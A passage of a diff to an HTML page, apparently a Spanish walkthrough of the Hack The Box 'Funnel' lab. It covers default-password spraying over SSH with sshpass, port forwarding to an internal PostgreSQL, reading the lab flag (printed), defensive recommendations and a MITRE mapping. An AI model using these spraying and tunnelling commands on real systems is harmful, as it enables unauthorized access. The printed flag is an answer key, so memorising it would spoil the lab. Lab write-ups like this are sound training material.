+        <div class="cmd-note"><code>2>/dev/null</code> → suprimir mensajes de error de conexiones fallidas</div>
+        <div class="cmd-note"><code>&& echo "EXITO: $user"</code> → solo imprime si el comando anterior tuvo exit code 0</div>
+      </div>
     </div>
 
-    <div class="section">
-      <div class="section-header"><div class="section-icon"></div><h2>Probar funnel123#!# en los 5 usuarios</h2></div>
-      
-
-<div class="why-box">
-<strong>¿Por qué sshpass en lugar de SSH interactivo?</strong>
-<p>SSH no acepta contraseñas en argumentos de línea de comandos por seguridad. <code>sshpass</code> es una utilidad que inyecta la contraseña de forma no interactiva, permitiendo automatizar con bucles de shell. Es el equivalente simple al módulo <code>ssh_login</code> de Metasploit para este caso básico.</p>
-</div>
-
-
-<div class="cmd-annotated">
-<div class="cmd-line">
-<span class="cmd">for</span>
-<span class="param"> user</span>
-<span class="flag-opt"> in</span>
-<span class="param"> optimus albert andreas christine maria</span><span class="cmd">; do</span><br/>
-          <span class="cmd">sshpass</span>
-<span class="flag-opt"> -p</span>
-<span class="param"> 'funnel123#!#'</span>
-<span class="cmd"> ssh</span>
-<span class="flag-opt"> -o StrictHostKeyChecking=no</span>
-<span class="user"> $user</span><span class="ip">@10.129.7.157</span>
-<span class="param"> 'id'</span>
-<span class="flag-opt"> 2&gt;/dev/null</span>
-<span class="cmd"> &amp;&amp; echo</span>
-<span class="param"> "EXITO: $user"</span><span class="cmd">; done</span>
-</div>
-<div class="cmd-notes">
-<div class="cmd-note"><code>for user in ...</code> → iterar sobre los 5 usuarios encontrados en el email</div>
-<div class="cmd-note"><code>sshpass -p 'funnel123#!#'</code> → proporcionar contraseña de forma no interactiva</div>
-<div class="cmd-note"><code>-o StrictHostKeyChecking=no</code> → no preguntar por confirmación de host key (automatización)</div>
-<div class="cmd-note"><code>'id'</code> → comando a ejecutar: si el login funciona, muestra uid/gid del usuario</div>
-<div class="cmd-note"><code>2&gt;/dev/null</code> → suprimir mensajes de error de conexiones fallidas</div>
-<div class="cmd-note"><code>&amp;&amp; echo "EXITO: $user"</code> → solo imprime si el comando anterior tuvo exit code 0</div>
-</div>
-</div>
-
-
-<div class="output-box">
-<div class="output-label">Output del bucle</div>
-<pre><span class="comment"># optimus → Permission denied (publickey,password)</span>
+    <div class="output-box">
+      <div class="output-label">Output del bucle</div>
+      <pre><span class="comment"># optimus → Permission denied (publickey,password)</span>
 <span class="comment"># albert  → Permission denied (publickey,password)</span>
 <span class="comment"># andreas → Permission denied (publickey,password)</span>
 <span class="hl-flag">uid=1000(christine) gid=1000(christine) groups=1000(christine)</span>
 EXITO: christine
 <span class="comment"># maria   → Permission denied (publickey,password)</span></pre>
-</div>
-
-
-<div class="interpret-box">
-<strong>¿Qué nos dice?</strong>
-<ul>
-<li>4 usuarios cambiaron su contraseña correctamente</li>
-<li><code>christine</code> no siguió la política corporativa y mantiene la contraseña por defecto</li>
-<li><code>uid=1000</code> → usuario normal del sistema, no root. Necesitamos explorar qué servicios internos están accesibles</li>
-</ul>
-</div>
-
-
-<div class="decision-box">
-<strong>Decisión</strong>
-<p>Shell como <code>christine</code>. Enumerar servicios internos con <code>ss -tlnp</code>.</p>
-</div>
-
-
     </div>
 
-    <div class="section">
-      <div class="section-header"><div class="section-icon"></div><h2>ss -tlnp — Ver qué escucha en loopback</h2></div>
-      
+    <div class="interpret-box">
+      <strong>¿Qué nos dice?</strong>
+      <ul>
+        <li>4 usuarios cambiaron su contraseña correctamente</li>
+        <li><code>christine</code> no siguió la política corporativa y mantiene la contraseña por defecto</li>
+        <li><code>uid=1000</code> → usuario normal del sistema, no root. Necesitamos explorar qué servicios internos están accesibles</li>
+      </ul>
+    </div>
+    <div class="decision-box">
+      <strong>Decisión</strong>
+      <p>Shell como <code>christine</code>. Enumerar servicios internos con <code>ss -tlnp</code>.</p>
+    </div>
+  </div>
 
-<div class="why-box">
-<strong>¿Por qué ss y no netstat?</strong>
-<p><code>ss</code> (Socket Statistics) es el reemplazo moderno de <code>netstat</code> en sistemas Linux actuales. Más rápido y con más información. Nos muestra todos los sockets TCP activos — especialmente los que escuchan solo en <code>127.0.0.1</code> (loopback), que <strong>no son visibles</strong> desde fuera con nmap pero sí son accesibles internamente.</p>
-</div>
+  <!-- PASO 5: ENUMERACIÓN INTERNA -->
+  <div class="step-box">
+    <div class="step-number">Paso 5 — Enumeración de servicios internos</div>
+    <h3>ss -tlnp — Ver qué escucha en loopback</h3>
 
+    <div class="why-box">
+      <strong>¿Por qué ss y no netstat?</strong>
+      <p><code>ss</code> (Socket Statistics) es el reemplazo moderno de <code>netstat</code> en sistemas Linux actuales. Más rápido y con más información. Nos muestra todos los sockets TCP activos — especialmente los que escuchan solo en <code>127.0.0.1</code> (loopback), que <strong>no son visibles</strong> desde fuera con nmap pero sí son accesibles internamente.</p>
+    </div>
 
-<div class="cmd-annotated">
-<div class="cmd-line">
-<span class="cmd">ss</span>
-<span class="flag-opt"> -t</span>
-<span class="flag-opt">l</span>
-<span class="flag-opt">n</span>
-<span class="flag-opt">p</span>
-</div>
-<div class="cmd-notes">
-<div class="cmd-note"><code>-t</code> → solo sockets TCP (no UDP)</div>
-<div class="cmd-note"><code>-l</code> → solo sockets en estado LISTEN (escuchando, esperando conexiones)</div>
-<div class="cmd-note"><code>-n</code> → mostrar números de puerto, no nombres de servicio (más rápido, más claro)</div>
-<div class="cmd-note"><code>-p</code> → mostrar el proceso/PID que tiene abierto cada socket</div>
-</div>
-</div>
+    <div class="cmd-annotated">
+      <div class="cmd-line">
+        <span class="cmd">ss</span>
+        <span class="flag-opt"> -t</span>
+        <span class="flag-opt">l</span>
+        <span class="flag-opt">n</span>
+        <span class="flag-opt">p</span>
+      </div>
+      <div class="cmd-notes">
+        <div class="cmd-note"><code>-t</code> → solo sockets TCP (no UDP)</div>
+        <div class="cmd-note"><code>-l</code> → solo sockets en estado LISTEN (escuchando, esperando conexiones)</div>
+        <div class="cmd-note"><code>-n</code> → mostrar números de puerto, no nombres de servicio (más rápido, más claro)</div>
+        <div class="cmd-note"><code>-p</code> → mostrar el proceso/PID que tiene abierto cada socket</div>
+      </div>
+    </div>
 
-
-<div class="output-box">
-<div class="output-label">Output ss -tlnp (ejecutado vía SSH)</div>
-<pre>Netid  State  Recv-Q  Send-Q  Local Address:Port  Peer Address:Port
+    <div class="output-box">
+      <div class="output-label">Output ss -tlnp (ejecutado vía SSH)</div>
+      <pre>Netid  State  Recv-Q  Send-Q  Local Address:Port  Peer Address:Port
 tcp    LISTEN   0      128     0.0.0.0:22          0.0.0.0:*         users:(("sshd",...))
 tcp    LISTEN   0      128     <span class="hl-warn">127.0.0.1:5432</span>      0.0.0.0:*         users:(("postgres",...))
 tcp    LISTEN   0      128     [::]:22             [::]:*</pre>
-</div>
-
-
-<div class="interpret-box">
-<strong>¿Qué encontramos?</strong>
-<ul>
-<li><code>0.0.0.0:22</code> → SSH escucha en todas las interfaces (ya lo sabíamos por nmap)</li>
-<li><span class="badge-yellow">127.0.0.1:5432</span> → PostgreSQL escucha <strong>solo</strong> en loopback. El <code>127.0.0.1</code> significa que solo acepta conexiones locales — por eso nmap no lo vio desde fuera</li>
-<li>Puerto 5432 → puerto estándar de PostgreSQL</li>
-<li>Proceso <code>postgres</code> → confirma que es el motor de base de datos PostgreSQL</li>
-</ul>
-</div>
-
-
-<div class="decision-box">
-<strong>Decisión</strong>
-<p>PostgreSQL interno en 5432. No es accesible directamente desde Kali. Usar SSH Port Forwarding para crear un túnel local y "traer" el puerto a nuestra máquina.</p>
-</div>
-
-
     </div>
 
-    <div class="section">
-      <div class="section-header"><div class="section-icon"></div><h2>Redirigir PostgreSQL interno a puerto local</h2></div>
-      
+    <div class="interpret-box">
+      <strong>¿Qué encontramos?</strong>
+      <ul>
+        <li><code>0.0.0.0:22</code> → SSH escucha en todas las interfaces (ya lo sabíamos por nmap)</li>
+        <li><span class="badge-yellow">127.0.0.1:5432</span> → PostgreSQL escucha <strong>solo</strong> en loopback. El <code>127.0.0.1</code> significa que solo acepta conexiones locales — por eso nmap no lo vio desde fuera</li>
+        <li>Puerto 5432 → puerto estándar de PostgreSQL</li>
+        <li>Proceso <code>postgres</code> → confirma que es el motor de base de datos PostgreSQL</li>
+      </ul>
+    </div>
+    <div class="decision-box">
+      <strong>Decisión</strong>
+      <p>PostgreSQL interno en 5432. No es accesible directamente desde Kali. Usar SSH Port Forwarding para crear un túnel local y "traer" el puerto a nuestra máquina.</p>
+    </div>
+  </div>
 
-<div class="why-box">
-<strong>¿Qué es SSH Local Port Forwarding y por qué funciona aquí?</strong>
-<p>SSH no solo sirve para abrir shells. La opción <code>-L</code> crea un <strong>túnel TCP</strong>: cualquier conexión al puerto local que especificamos se encripta por SSH y se redirige al servidor remoto, que la reenvía al destino. En este caso: <code>localhost:15432 → [encrypted SSH] → 10.129.7.157 → 127.0.0.1:5432</code>. El servidor hace el salto final a su propio loopback — algo que nosotros no podemos hacer directamente.</p>
-</div>
+  <!-- PASO 6: SSH PORT FORWARDING -->
+  <div class="step-box">
+    <div class="step-number">Paso 6 — SSH Port Forwarding (Local Tunnel)</div>
+    <h3>Redirigir PostgreSQL interno a puerto local</h3>
 
+    <div class="why-box">
+      <strong>¿Qué es SSH Local Port Forwarding y por qué funciona aquí?</strong>
+      <p>SSH no solo sirve para abrir shells. La opción <code>-L</code> crea un <strong>túnel TCP</strong>: cualquier conexión al puerto local que especificamos se encripta por SSH y se redirige al servidor remoto, que la reenvía al destino. En este caso: <code>localhost:15432 → [encrypted SSH] → 10.129.7.157 → 127.0.0.1:5432</code>. El servidor hace el salto final a su propio loopback — algo que nosotros no podemos hacer directamente.</p>
+    </div>
 
-<div class="cmd-annotated">
-<div class="cmd-line">
-<span class="cmd">ssh</span>
-<span class="flag-opt"> -f</span>
-<span class="flag-opt"> -N</span>
-<span class="flag-opt"> -L</span>
-<span class="param"> 15432:127.0.0.1:5432</span>
-<span class="user"> christine</span><span class="ip">@10.129.7.157</span>
-</div>
-<div class="cmd-notes">
-<div class="cmd-note"><code>-f</code> → fork: poner el proceso SSH en background automáticamente (no bloquea la terminal)</div>
-<div class="cmd-note"><code>-N</code> → no ejecutar ningún comando remoto (solo mantener el túnel activo, sin abrir shell)</div>
-<div class="cmd-note"><code>-L 15432:127.0.0.1:5432</code> → Local forward:<br/>   • <code>15432</code> = puerto en NUESTRA máquina Kali donde escucha el túnel<br/>   • <code>127.0.0.1:5432</code> = destino desde el punto de vista del servidor remoto (su propio loopback PostgreSQL)</div>
-<div class="cmd-note"><code>christine@10.129.7.157</code> → usuario SSH y servidor que actúa como "puente" del túnel</div>
-<div class="cmd-note" style="border-left-color:var(--accent);color:var(--accent);">Usamos 15432 en lugar de 5432 para evitar conflictos con PostgreSQL local en Kali (si existiera)</div>
-</div>
-</div>
+    <div class="cmd-annotated">
+      <div class="cmd-line">
+        <span class="cmd">ssh</span>
+        <span class="flag-opt"> -f</span>
+        <span class="flag-opt"> -N</span>
+        <span class="flag-opt"> -L</span>
+        <span class="param"> 15432:127.0.0.1:5432</span>
+        <span class="user"> christine</span><span class="ip">@10.129.7.157</span>
+      </div>
+      <div class="cmd-notes">
+        <div class="cmd-note"><code>-f</code> → fork: poner el proceso SSH en background automáticamente (no bloquea la terminal)</div>
+        <div class="cmd-note"><code>-N</code> → no ejecutar ningún comando remoto (solo mantener el túnel activo, sin abrir shell)</div>
+        <div class="cmd-note"><code>-L 15432:127.0.0.1:5432</code> → Local forward:<br>&nbsp;&nbsp;&nbsp;• <code>15432</code> = puerto en NUESTRA máquina Kali donde escucha el túnel<br>&nbsp;&nbsp;&nbsp;• <code>127.0.0.1:5432</code> = destino desde el punto de vista del servidor remoto (su propio loopback PostgreSQL)</div>
+        <div class="cmd-note"><code>christine@10.129.7.157</code> → usuario SSH y servidor que actúa como "puente" del túnel</div>
+        <div class="cmd-note" style="border-left-color:var(--accent);color:var(--accent);">Usamos 15432 en lugar de 5432 para evitar conflictos con PostgreSQL local en Kali (si existiera)</div>
+      </div>
+    </div>
 
-
-<div class="output-box">
-<div class="output-label">Verificación del túnel</div>
-<pre><span class="comment"># Confirmar que el puerto local está escuchando:</span>
+    <div class="output-box">
+      <div class="output-label">Verificación del túnel</div>
+      <pre><span class="comment"># Confirmar que el puerto local está escuchando:</span>
 <span class="cmd">ss -tlnp | grep 15432</span>
 tcp  LISTEN  0  128  127.0.0.1:15432  0.0.0.0:*  users:(("ssh",...))
 
 <span class="comment"># El proceso ssh está forwarding el puerto — túnel activo ✅</span></pre>
-</div>
-
-
-<div class="interpret-box">
-<strong>Cómo funciona el túnel</strong>
-<ul>
-<li>Kali <code>localhost:15432</code> → proceso ssh en Kali recibe la conexión</li>
-<li>ssh encripta el tráfico y lo envía por el canal SSH a 10.129.7.157</li>
-<li>El servidor SSH en 10.129.7.157 desencripta y conecta a <code>127.0.0.1:5432</code> (su PostgreSQL local)</li>
-<li>Para PostgreSQL, la conexión parece venir de <code>127.0.0.1</code> (local) → acepta sin restricciones de red</li>
-</ul>
-</div>
-
-
-<div class="decision-box">
-<strong>Decisión</strong>
-<p>Túnel activo en localhost:15432. Conectar con psql usando las credenciales de christine.</p>
-</div>
-
-
     </div>
 
-    <div class="section">
-      <div class="section-header"><div class="section-icon"></div><h2>Conexión, exploración de bases de datos y extracción</h2></div>
-      
+    <div class="interpret-box">
+      <strong>Cómo funciona el túnel</strong>
+      <ul>
+        <li>Kali <code>localhost:15432</code> → proceso ssh en Kali recibe la conexión</li>
+        <li>ssh encripta el tráfico y lo envía por el canal SSH a 10.129.7.157</li>
+        <li>El servidor SSH en 10.129.7.157 desencripta y conecta a <code>127.0.0.1:5432</code> (su PostgreSQL local)</li>
+        <li>Para PostgreSQL, la conexión parece venir de <code>127.0.0.1</code> (local) → acepta sin restricciones de red</li>
+      </ul>
+    </div>
+    <div class="decision-box">
+      <strong>Decisión</strong>
+      <p>Túnel activo en localhost:15432. Conectar con psql usando las credenciales de christine.</p>
+    </div>
+  </div>
 
-<div class="why-box">
-<strong>¿Por qué usamos PGPASSWORD en lugar de introducir la contraseña interactivamente?</strong>
-<p><code>psql</code> pide contraseña interactivamente por defecto. La variable de entorno <code>PGPASSWORD</code> permite pasarla de forma no interactiva, útil para scripting y automatización. <code>psql</code> es el cliente oficial de línea de comandos de PostgreSQL.</p>
-</div>
+  <!-- PASO 7: POSTGRESQL -->
+  <div class="step-box">
+    <div class="step-number">Paso 7 — PostgreSQL: encontrar la flag</div>
+    <h3>Conexión, exploración de bases de datos y extracción</h3>
 
+    <div class="why-box">
+      <strong>¿Por qué usamos PGPASSWORD en lugar de introducir la contraseña interactivamente?</strong>
+      <p><code>psql</code> pide contraseña interactivamente por defecto. La variable de entorno <code>PGPASSWORD</code> permite pasarla de forma no interactiva, útil para scripting y automatización. <code>psql</code> es el cliente oficial de línea de comandos de PostgreSQL.</p>
+    </div>
 
-<div class="cmd-annotated">
-<div class="cmd-line">
-<span class="cmd">PGPASSWORD=</span><span class="param">'funnel123#!#'</span>
-<span class="cmd"> psql</span>
-<span class="flag-opt"> -h</span>
-<span class="ip"> 127.0.0.1</span>
-<span class="flag-opt"> -p</span>
-<span class="param"> 15432</span>
-<span class="flag-opt"> -U</span>
-<span class="user"> christine</span>
-</div>
-<div class="cmd-notes">
-<div class="cmd-note"><code>PGPASSWORD='funnel123#!#'</code> → variable de entorno con la contraseña (misma que SSH — reutilización de credenciales)</div>
-<div class="cmd-note"><code>-h 127.0.0.1</code> → conectar a localhost (donde escucha nuestro túnel SSH)</div>
-<div class="cmd-note"><code>-p 15432</code> → puerto del túnel local (no el 5432 real del servidor)</div>
-<div class="cmd-note"><code>-U christine</code> → usuario de PostgreSQL (mismo nombre que el usuario del sistema)</div>
-</div>
-</div>
+    <div class="cmd-annotated">
+      <div class="cmd-line">
+        <span class="cmd">PGPASSWORD=</span><span class="param">'funnel123#!#'</span>
+        <span class="cmd"> psql</span>
+        <span class="flag-opt"> -h</span>
+        <span class="ip"> 127.0.0.1</span>
+        <span class="flag-opt"> -p</span>
+        <span class="param"> 15432</span>
+        <span class="flag-opt"> -U</span>
+        <span class="user"> christine</span>
+      </div>
+      <div class="cmd-notes">
+        <div class="cmd-note"><code>PGPASSWORD='funnel123#!#'</code> → variable de entorno con la contraseña (misma que SSH — reutilización de credenciales)</div>
+        <div class="cmd-note"><code>-h 127.0.0.1</code> → conectar a localhost (donde escucha nuestro túnel SSH)</div>
+        <div class="cmd-note"><code>-p 15432</code> → puerto del túnel local (no el 5432 real del servidor)</div>
+        <div class="cmd-note"><code>-U christine</code> → usuario de PostgreSQL (mismo nombre que el usuario del sistema)</div>
+      </div>
+    </div>
 
-
-<div class="output-box">
-<div class="output-label">Sesión psql completa</div>
-<pre>psql (14.5 (Ubuntu 14.5-0ubuntu0.22.04.1))
+    <div class="output-box">
+      <div class="output-label">Sesión psql completa</div>
+      <pre>psql (14.5 (Ubuntu 14.5-0ubuntu0.22.04.1))
 SSL connection (protocol: TLSv1.3, cipher: TLS_AES_256_GCM_SHA384, bits: 256, compression: off)
 Type "help" for help.
 
@@ -684,97 +861,365 @@ secrets=# <span class="cmd">SELECT * FROM flag;</span>
 ----------------------------------
  <span class="hl-flag">cf277664b1771217d7006acdea006db1</span>
 (1 row)</pre>
+    </div>
+
+    <div class="interpret-box">
+      <strong>Resultado</strong>
+      <ul>
+        <li><code>\l</code> → lista todas las bases de datos. <code>secrets</code> tiene un nombre muy sugerente</li>
+        <li><code>\c secrets</code> → cambiar a la base de datos <code>secrets</code></li>
+        <li><code>\dt</code> → listar tablas. Solo hay una: <code>flag</code></li>
+        <li><code>SELECT * FROM flag</code> → extraer todos los registros. La flag es el único contenido</li>
+        <li>La contraseña de christine funcionó también para PostgreSQL → reutilización de credenciales</li>
+      </ul>
+    </div>
+  </div>
 </div>
 
-
-<div class="interpret-box">
-<strong>Resultado</strong>
-<ul>
-<li><code>\l</code> → lista todas las bases de datos. <code>secrets</code> tiene un nombre muy sugerente</li>
-<li><code>\c secrets</code> → cambiar a la base de datos <code>secrets</code></li>
-<li><code>\dt</code> → listar tablas. Solo hay una: <code>flag</code></li>
-<li><code>SELECT * FROM flag</code> → extraer todos los registros. La flag es el único contenido</li>
-<li>La contraseña de christine funcionó también para PostgreSQL → reutilización de credenciales</li>
-</ul>
-</div>
-
-
-    </div>
-
-    <div class="section">
-      <div class="section-header"><div class="section-icon"></div><h2>Flag</h2></div>
-      
-
-    </div>
-
-    <div class="section">
-      <div class="section-header"><div class="section-icon"></div><h2>Recomendaciones</h2></div>
-      
-
-    </div>
-
-    <div class="section">
-      <div class="section-header"><div class="section-icon"></div><h2>Panel de Agentes Ghost-Ops</h2></div>
-      
-
-    </div>
-
-    <div class="section">
-      <div class="section-header"><div class="section-icon"></div><h2>Lecciones Aprendidas</h2></div>
-      
-
-    </div>
-
-    <div class="section">
-      <div class="section-header"><div class="section-icon"></div><h2>MITRE ATT&CK</h2></div>
-      
-
-    </div>
-
-    <div class="section">
-      <div class="section-header"><div class="section-icon"></div><h2>Glosario</h2></div>
-      
-
-    </div>
-
+<!-- ═══════════════════ 6. FLAG ═══════════════════ -->
+<div class="section" id="flag">
+  <div class="section-title">
+    <span class="section-number">6</span>
+    <h2>Flag</h2>
   </div>
 
-  <div class="sidebar">
-    <div class="sidebar-card">
-      <h3>Detalles del Reto</h3>
-      <div class="detail-row"><span class="detail-key">Dificultad</span><span class="detail-val green">VERY EASY</span></div>
-      <div class="detail-row"><span class="detail-key">Sistema Operativo</span><span class="detail-val">Linux</span></div>
-      <div class="detail-row"><span class="detail-key">IP Target</span><span class="detail-val cyan">10.129.X.X</span></div>
-      <div class="detail-row"><span class="detail-key">Tipo</span><span class="detail-val">Starting Point</span></div>
-      <div class="detail-row"><span class="detail-key">Vectores</span><span class="detail-val">SSH Tunnel + PostgreSQL</span></div>
-      <div class="detail-row"><span class="detail-key">CVE</span><span class="detail-val">—</span></div>
+  <div class="flag-box">
+    <div style="font-size:2rem;margin-bottom:.75rem;">🏁</div>
+    <div class="flag-label">HTB Funnel — Flag (PostgreSQL database: secrets, table: flag)</div>
+    <div class="flag-value">cf277664b1771217d7006acdea006db1</div>
+    <p style="color:var(--text-muted);font-size:.8rem;margin-top:1rem;">
+      Ruta: FTP anon → mail_backup/password_policy.pdf → funnel123#!# → SSH christine → ss -tlnp → 127.0.0.1:5432 → ssh -L 15432 → psql → SELECT * FROM flag
+    </p>
+  </div>
+</div>
+
+<!-- ═══════════════════ 7. RECOMENDACIONES ═══════════════════ -->
+<div class="section" id="recomendaciones">
+  <div class="section-title">
+    <span class="section-number">7</span>
+    <h2>Recomendaciones</h2>
+  </div>
+
+  <div class="rec-grid">
+    <div class="rec-card">
+      <span class="rec-badge priority-high">Alta Prioridad</span>
+      <h4>Deshabilitar FTP anónimo</h4>
+      <p>En <code>/etc/vsftpd.conf</code> establecer <code>anonymous_enable=NO</code>. Si se necesita compartir archivos externamente, usar SFTP con autenticación por clave o un servicio con control de acceso adecuado. Nunca almacenar documentos corporativos en directorios de FTP anónimo.</p>
     </div>
-    <div class="sidebar-card">
-      <h3>Skills Demostradas</h3>
-      <div class="skill-item"><div class="skill-header"><span class="skill-name">SSH Tunneling</span><span class="skill-pct">92%</span></div><div class="skill-bar"><div class="skill-fill" style="width:92%"></div></div></div>
-      <div class="skill-item"><div class="skill-header"><span class="skill-name">PostgreSQL</span><span class="skill-pct">88%</span></div><div class="skill-bar"><div class="skill-fill" style="width:88%"></div></div></div>
-      <div class="skill-item"><div class="skill-header"><span class="skill-name">FTP</span><span class="skill-pct">85%</span></div><div class="skill-bar"><div class="skill-fill" style="width:85%"></div></div></div>
+    <div class="rec-card">
+      <span class="rec-badge priority-high">Alta Prioridad</span>
+      <h4>Forzar cambio de contraseña en primer login</h4>
+      <p>Usar <code>chage -d 0 usuario</code> en Linux para marcar la contraseña como expirada, forzando el cambio en el siguiente login SSH. Implementar un sistema de gestión de identidades que verifique que el cambio se realizó. Auditar periódicamente cuentas con contraseñas por defecto.</p>
     </div>
-    <div class="sidebar-card">
-      <h3>Herramientas</h3>
-      <div class="tools-list">
-        <div class="tool-item"><div class="tool-dot"></div><span class="tool-name">nmap</span></div>
-        <div class="tool-item"><div class="tool-dot"></div><span class="tool-name">ftp</span></div>
-        <div class="tool-item"><div class="tool-dot"></div><span class="tool-name">ssh</span></div>
-        <div class="tool-item"><div class="tool-dot"></div><span class="tool-name">psql</span></div>
+    <div class="rec-card">
+      <span class="rec-badge priority-medium">Prioridad Media</span>
+      <h4>No documentar contraseñas por defecto en PDFs</h4>
+      <p>La política de contraseñas no debería incluir la contraseña por defecto en texto plano. En su lugar, usar un sistema de onboarding que genere contraseñas únicas por usuario enviadas por canal seguro (no correo interno). El PDF debería describir los requisitos sin revelar la contraseña.</p>
+    </div>
+    <div class="rec-card">
+      <span class="rec-badge priority-medium">Prioridad Media</span>
+      <h4>Segmentar acceso a PostgreSQL</h4>
+      <p>Crear usuarios PostgreSQL dedicados con permisos mínimos (solo SELECT en tablas necesarias). No reutilizar credenciales del sistema operativo en bases de datos. Configurar <code>pg_hba.conf</code> para requerir autenticación fuerte. Considerar cifrado de datos sensibles en la BD.</p>
+    </div>
+    <div class="rec-card">
+      <span class="rec-badge priority-low">Baja Prioridad</span>
+      <h4>Monitoreo de FTP y SSH</h4>
+      <p>Activar logging detallado en vsftpd (<code>xferlog_enable=YES</code>). Implementar fail2ban para SSH. Alertar sobre logins FTP anónimos con descarga de archivos. Monitorear comandos SSH ejecutados (<code>ForceCommand</code> + logging).</p>
+    </div>
+    <div class="rec-card">
+      <span class="rec-badge priority-low">Baja Prioridad</span>
+      <h4>Principio de mínimo privilegio en FTP</h4>
+      <p>Si se necesita FTP para distribución de archivos, crear un directorio con solo archivos públicos (manuales de uso, no documentos corporativos). Revisar qué archivos están accesibles. Nunca exponer backups de correo o documentos internos por FTP.</p>
+    </div>
+  </div>
+</div>
+
+<!-- ═══════════════════ 8. GHOST-OPS AGENTS ═══════════════════ -->
+<div class="section">
+  <div class="section-title">
+    <span class="section-number">8</span>
+    <h2>Panel de Agentes Ghost-Ops</h2>
+  </div>
+  <div class="agent-panel">
+    <div class="agent-card rto">
+      <div class="agent-label">⚔ RTO — Red Team</div>
+      <p>FTP anon siempre debe explorarse antes de intentar exploits complejos. Buscar archivos .pdf, .docx, .txt — especialmente en directorios con nombres como backup, mail, internal. Con usuarios del email → brute SSH/FTP/RDP/SMB con pass por defecto. En el host: <code>ss -tlnp</code> inmediatamente para descubrir servicios internos. Port forwarding SSH es invisble para firewalls perimetrales.</p>
+    </div>
+    <div class="agent-card bta">
+      <div class="agent-label">🛡 BTA — Blue Team</div>
+      <p>Ruido generado: BAJO. FTP anon = 1 conexión TCP limpia. SSH login = 1 intento por usuario (no es brute fuerza voluminosa). El túnel SSH-L es encriptado y pasa por el puerto 22 → casi invisible para DPI básico. Detectable con: monitoreo de sesiones SSH con comandos sospechosos (<code>ss -tlnp</code> es legítimo). Alertar sobre FTP anon + descarga de archivos PDF/DOC.</p>
+    </div>
+    <div class="agent-card bhm">
+      <div class="agent-label">🎭 BHM — Black Hat</div>
+      <p>"Funnel" = embudo de información. Siempre buscar el elemento más débil de la cadena: aquí fue el usuario que no cambió la pass. En entornos reales: después de PostgreSQL, buscar credenciales hardcodeadas en la BD para movimiento lateral. SSH -L también sirve para tunelizar RDP, SMB, HTTP interno. Combinar con <code>-D</code> (SOCKS proxy) para acceso completo a red interna.</p>
+    </div>
+  </div>
+</div>
+
+<!-- ═══════════════════ 9. LECCIONES ═══════════════════ -->
+<div class="section" id="lecciones">
+  <div class="section-title">
+    <span class="section-number">9</span>
+    <h2>Lecciones Aprendidas</h2>
+  </div>
+
+  <div class="lessons-grid">
+    <div class="lesson-card attacker">
+      <h4>⚔ Para el Atacante</h4>
+      <ul>
+        <li>FTP anónimo = gold mine de información. Siempre descargar TODOS los archivos y leerlos</li>
+        <li>PDFs tienen texto en streams zlib comprimidos — <code>pdftotext</code> o Python + zlib los extrae</li>
+        <li>Lista de usuarios del sistema = lista de targets para brute force</li>
+        <li><code>ss -tlnp</code> (o <code>netstat -tlnp</code>) es el primer comando tras obtener shell — ver servicios internos</li>
+        <li>SSH <code>-L localport:127.0.0.1:remoteport</code> = acceso a cualquier servicio en loopback del servidor</li>
+        <li>PostgreSQL por defecto crea rol con el mismo nombre que el usuario del SO → probar misma contraseña</li>
+        <li>La contraseña por defecto puede valer para múltiples servicios (SSH + BD)</li>
+      </ul>
+    </div>
+    <div class="lesson-card defender">
+      <h4>🛡 Para el Defensor</h4>
+      <ul>
+        <li>FTP anónimo = NO en producción. Si necesitas distribución de archivos, usa HTTPS o SFTP con auth</li>
+        <li>Jamás almacenar documentos corporativos sensibles en directorios FTP accesibles</li>
+        <li>Forzar cambio de contraseña en primer login: <code>chage -d 0 usuario</code></li>
+        <li>Contraseñas por defecto no deben aparecer en documentos PDF/Word/Email</li>
+        <li>Auditar regularmente: <code>for u in $(cut -d: -f1 /etc/passwd); do chage -l $u; done</code></li>
+        <li>Usuarios de BD con permisos mínimos, contraseñas distintas a las del SO</li>
+        <li>Monitorizar sesiones SSH largas con <code>-N</code> (sin comandos) = posibles túneles</li>
+      </ul>
+    </div>
+  </div>
+</div>
+
+<!-- ═══════════════════ MITRE ATT&CK TABLE ═══════════════════ -->
+<div class="section" id="mitre">
+  <div class="section-title">
+    <span class="section-number">10</span>
+    <h2>MITRE ATT&amp;CK</h2>
+  </div>
+  <table class="data-table">
+    <tr>
+      <th>ID</th>
+      <th>Técnica</th>
+      <th>Fase</th>
+      <th>Uso en Funnel</th>
+    </tr>
+    <tr>
+      <td><code>T1046</code></td>
+      <td>Network Service Discovery</td>
+      <td><span class="badge-blue">Recon</span></td>
+      <td>Nmap descubre FTP 21 y SSH 22</td>
+    </tr>
+    <tr>
+      <td><code>T1190</code></td>
+      <td>Exploit Public-Facing Application</td>
+      <td><span class="badge-red">Initial Access</span></td>
+      <td>FTP anónimo expone mail_backup con info sensible</td>
+    </tr>
+    <tr>
+      <td><code>T1552.001</code></td>
+      <td>Credentials in Files</td>
+      <td><span class="badge-yellow">Credential Access</span></td>
+      <td>PDF password_policy.pdf contiene la contraseña por defecto <code>funnel123#!#</code></td>
+    </tr>
+    <tr>
+      <td><code>T1078</code></td>
+      <td>Valid Accounts</td>
+      <td><span class="badge-red">Initial Access</span></td>
+      <td>christine no cambió su contraseña por defecto → login SSH válido</td>
+    </tr>
+    <tr>
+      <td><code>T1021.004</code></td>
+      <td>Remote Services: SSH</td>
+      <td><span class="badge-purple">Lateral Movement</span></td>
+      <td>SSH como christine para acceso al sistema y creación de túnel</td>
+    </tr>
+    <tr>
+      <td><code>T1572</code></td>
+      <td>Protocol Tunneling</td>
+      <td><span class="badge-cyan">Command &amp; Control</span></td>
+      <td>SSH -L 15432 para tunelizar PostgreSQL interno al cliente atacante</td>
+    </tr>
+    <tr>
+      <td><code>T1005</code></td>
+      <td>Data from Local System</td>
+      <td><span class="badge-yellow">Collection</span></td>
+      <td>SELECT * FROM flag en base de datos secrets de PostgreSQL</td>
+    </tr>
+  </table>
+</div>
+
+<!-- ═══════════════════ GLOSARIO ═══════════════════ -->
+<div class="section" id="glosario">
+  <div class="section-title">
+    <span class="section-number">11</span>
+    <h2>Glosario</h2>
+  </div>
+
+  <div style="display:grid;grid-template-columns:1fr 1fr;gap:0 2rem;">
+    <div>
+      <div class="glosario-item">
+        <span class="glosario-term">FTP (File Transfer Protocol)</span>
+        <span class="glosario-def">Protocolo de red para transferencia de archivos. Puerto 21 TCP. Sin cifrado. El modo anónimo permite acceso sin credenciales.</span>
+      </div>
+      <div class="glosario-item">
+        <span class="glosario-term">vsftpd</span>
